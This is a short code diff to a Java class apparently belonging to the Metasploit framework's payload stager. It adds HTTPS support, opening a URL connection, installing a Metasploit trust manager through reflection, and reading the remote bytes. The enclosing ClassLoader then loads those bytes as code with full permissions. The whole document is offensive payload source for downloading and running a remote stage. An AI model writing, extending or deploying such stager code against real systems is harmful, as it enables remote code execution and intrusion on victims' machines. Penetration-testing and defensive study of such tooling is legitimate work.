@@ -46,6 +46,7 @@ import java.io.PrintStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
+import java.net.URLConnection;
 import java.security.AllPermission;
 import java.security.CodeSource;
 import java.security.Permissions;
@@ -179,7 +180,13 @@ public class Payload extends ClassLoader {
 				if (url.startsWith("raw:"))
 					// for debugging: just use raw bytes from property file
 					in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
-				else
+				else if (url.startsWith("https:")) {
+					URLConnection uc = new URL(url).openConnection();
+					// load the trust manager via reflection, to avoid loading
+					// it when it is not needed (it requires Sun Java 1.4+)
+					Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {uc});
+					in = uc.getInputStream();
+				} else
 					in = new URL(url).openStream();
 				out = new ByteArrayOutputStream();
 			} else {
